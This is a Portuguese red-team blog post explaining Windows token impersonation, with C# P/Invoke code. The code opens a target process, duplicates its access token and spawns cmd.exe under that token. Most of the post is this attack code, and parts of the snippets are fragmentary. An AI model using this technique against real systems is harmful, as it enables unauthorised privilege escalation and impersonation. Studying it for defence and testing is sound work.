---
title: "Token Impersonation: uma análise interna."
date: 2024-02-11 00:00:00 +0800
categories: [Windows, Token, Impersonation]
tags: [Red Team]
---

![Desktop View](https://i.imgur.com/PGn18Vb.png){: width="300" height="100" }

O Windows não economiza quando o assunto é vetores de ataque. As inúmeras maneiras de se executar um comando, de elevar privilégios, de persistências, se tornaram uma marca registrada do sistema.

Hoje, vamos nos aprofundar numa técnica de ataque que, particularmente, acho bem interessante: **Token Impersonation**.

Basicamente, o ataque consiste nas seguintes etapas:

- Abrir um handle ao token do processo;
- Duplicar este handle (token);
- Impersonificar o token referenciado pelo handle.

## OpenProcess

Primeiramente, é necessária a abertura de um handle ao processo alvo que queremos manipular o token.

```csharp
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

static void Main(string[] args)
{
	IntPtr hProcess = OpenProcess(0x1000/*PROCESS_QUERY_LIMITED_INFORMATION*/, false, Convert.ToInt32(args[0]));

	Console.WriteLine(
		hProcess == IntPtr.Zero
		? $"OpenProcess ERROR: {Marshal.GetLastWin32Error()}"
		: $"OpenProcess SUCCESS: {hProcess}"
	);
}
```

>`PROCESS_QUERY_LIMITED_INFORMATION (0x1000)`: o nível de acesso que o handle terá. Esta é a permissão mínima necessária para manipular tokens de processos.
{: .prompt-info }

Note que foi aberto um handle ao processo. A variável que armazenará este handle é a `hProcess`, que utilizaremos posteriormente nas próximas APIs.

## OpenProcessToken

Agora, o objetivo é abrir um handle para o token deste processo. Para isso, a `OpenProcessToken` desempenha a função necessária para esta etapa.

```csharp
[DllImport("advapi32", SetLastError = true)]
static extern IntPtr OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

static void Main(string[] args)
{
	IntPtr tokenPtr = OpenProcessToken(hProcess, 0x0002/*TOKEN_DUPLICATE*/, out IntPtr hToken);
	Console.WriteLine(
		tokenPtr == IntPtr.Zero
		? $"OpenProcessToken ERROR: {Marshal.GetLastWin32Error()}"
		: $"OpenProcessToken SUCCESS: {hToken}" // hToken = handle do token
	);

	if (tokenPtr == IntPtr.Zero || hToken == IntPtr.Zero) Environment.Exit(0);
	CloseHandle(hProcess);
	CloseHandle(tokenPtr);
}
```

Onde:

- `DesiredAccess`: especifica uma máscara de acesso que simboliza os tipos solicitados de acesso ao token.
- `TokenHandle`: o handle do token.


Ainda falando sobre a [máscara de acesso do token](https://learn.microsoft.com/pt-br/windows/win32/secauthz/access-rights-for-access-token-objects), ela trabalha de forma bastante similar com o `processAccess` do `OpenProcess`. Neste caso, como este token (hToken) será duplicado posteriormente, a única permissão necessária, neste caso, é a de `TOKEN_DUPLICATE`, representada pelo valor `0x0002`.

## DuplicateTokenEx

Como vimos, já temos um handle em aberto ao token representado pela variável `hToken`. O próximo passo agora é duplicá-lo para que possamos impersonificá-lo posteriormente.

```csharp
enum SECURITY_IMPERSONATION_LEVEL
{
	SecurityAnonymous,
	SecurityIdentification,
	SecurityImpersonation,
	SecurityDelegation
}

enum TOKEN_TYPE
{
	TokenPrimary = 1,
	TokenImpersonation
}

[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
static extern bool DuplicateTokenEx(
	IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes,
	SECURITY_IMPERSONATION_LEVEL impersonationLevel, TOKEN_TYPE tokenType, out IntPtr hNewToken
);

static void Main(string[] args)
{
	bool duplicate = DuplicateTokenEx(
		hToken,
		0x02000000 /*MAXIMUM_ALLOWED*/,
		IntPtr.Zero /*default security descriptor*/,
		SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
		TOKEN_TYPE.TokenImpersonation,
		out IntPtr hNewToken
	);

	Console.WriteLine(
		duplicate == false
		? $"DuplicateTokenEx ERROR: {Marshal.GetLastWin32Error()}"
		: $"DuplicateTokenEx SUCCESS: {hNewToken}"
	);

	if (hNewToken == IntPtr.Zero) Environment.Exit(0);
	CloseHandle(hToken);
}
```

Como vimos, diversos valores são repassados. Vamos nos atentar aos principais:

- `dwDesiredAccess`: nível de acesso do token duplicado.
- `SECURITY_IMPERSONATION_LEVEL`: o nível de segurança de impersonificação, representando o grau em que um processo servidor pode agir em nome de um processo cliente.
- `TOKEN_TYPE`: o tipo do token, podendo ser um primário (um criado do zero, diretamente pelo kernel), ou um impersonificado.

Onde, na chamada da API:

- O valor `0x02000000` é repassado no `dwDesiredAccess`. Este valor simboliza o MAXIMUM_ALLOWED, que significa o máximo permitido.
- O valor `SecurityImpersonation` é repassado no `SECURITY_IMPERSONATION_LEVEL`. Este valor simboliza que o servidor pode impersonificar o contexto de segurança do cliente em sistemas locais.
- O valor `TokenImpersonation` é repassado no `TOKEN_TYPE`. Este valor simboliza que o token será do tipo impersonificado.

## CreateProcessWithTokenW

Como última etapa, partiremos para a criação de um novo processo a partir do token que duplicamos.

```csharp
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
struct STARTUPINFO
{
	UInt32 cb;
	string lpReserved;
	string lpDesktop;
	string lpTitle;
	Int32 dwX;
	Int32 dwY;
	Int32 dwXSize;
	Int32 dwYSize;
	Int32 dwXCountChars;
	Int32 dwYCountChars;
	Int32 dwFillAttribute;
	Int32 dwFlags;
	Int16 wShowWindow;
	Int16 cbReserved2;
	IntPtr lpReserved2;
	IntPtr hStdInput;
	IntPtr hStdOutput;
	IntPtr hStdError;
}

[StructLayout(LayoutKind.Sequential)]
struct PROCESS_INFORMATION
{
	IntPtr hProcess;
	IntPtr hThread;
	int dwProcessId;
	int dwThreadId;
}

enum LogonFlags
{
	LOGON_WITH_PROFILE = 0x00000001,
	LOGON_NETCREDENTIALS_ONLY = 0x00000002
}

[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
static extern bool CreateProcessWithTokenW(
	IntPtr hToken,
	LogonFlags dwLogonFlags,
	string lpApplicationName,
	string lpCommandLine,
	int dwCreationFlags,
	IntPtr lpEnvironment,
	string lpCurrentDirectory,
	[In] ref STARTUPINFO lpStartupInfo,
	out PROCESS_INFORMATION lpProcessInformation
);

static void Main(string[] args)
{
	STARTUPINFO si = new STARTUPINFO();
	PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();

	bool createProcess = CreateProcessWithTokenW(
		hNewToken,
		LogonFlags.LOGON_NETCREDENTIALS_ONLY,
		@"C:\Windows\System32\cmd.exe",
		null,
		0,
		IntPtr.Zero,
		null,
		ref si,
		out processInformation
	);

	Console.WriteLine(
		createProcess == false
		? $"CreateProcessWithTokenW ERROR: {Marshal.GetLastWin32Error()}"
		: $"CreateProcessWithTokenW SUCCESS: {createProcess}"
	);
			
	CloseHandle(hNewToken);
}
```

Alguns dos valores importantes:

- `dwLogonFlags`: a opção de logon. Existem duas opções: `LOGON_WITH_PROFILE (0x00000001)` e `LOGON_NETCREDENTIALS_ONLY (0x00000002)`.
- `lpApplicationName`: o que será executado na criação do novo processo. É possível especificar um binário para a execução.
- `dwCreationFlags`: os sinalizadores que controlam como o processo é criado. Os sinalizadores `CREATE_DEFAULT_ERROR_MODE`, `CREATE_NEW_CONSOLE` e `CREATE_NEW_PROCESS_GROUP` estão habilitados por padrão.
- `lpStartupInfo`: um ponteiro para a estrutura `STARTUPINFO` (que armazena informações como estação de janela, aparência do processo)
- `lpProcessInformation`: um ponteiro para uma estrutura `PROCESS_INFORMATION` que recebe informações de identificação para o novo processo, incluindo um identificador para o processo.

Onde, na chamada da API:

- O valor `LOGON_NETCREDENTIALS_ONLY` é repassado no `dwLogonFlags`, sinalizando a criação do logon sem alterar na chave do registro.
- O caminho do binário CMD.EXE é repassado no `lpApplicationName`, sinalizando a criação de um novo processo cmd.
- O valor "0" é repassado no `dwCreationFlags`, onde o novo processo obterá os sinalizadores padrões do sistema.

## IMPERSONATE 4 THE WIN!

Depois de todos esses passos, se tudo ocorrer bem, um novo processo CMD.EXE será criado a partir do token de acesso que especificamos no `hNewToken`.

![Desktop View](https://i.imgur.com/YV0wY0t.png)
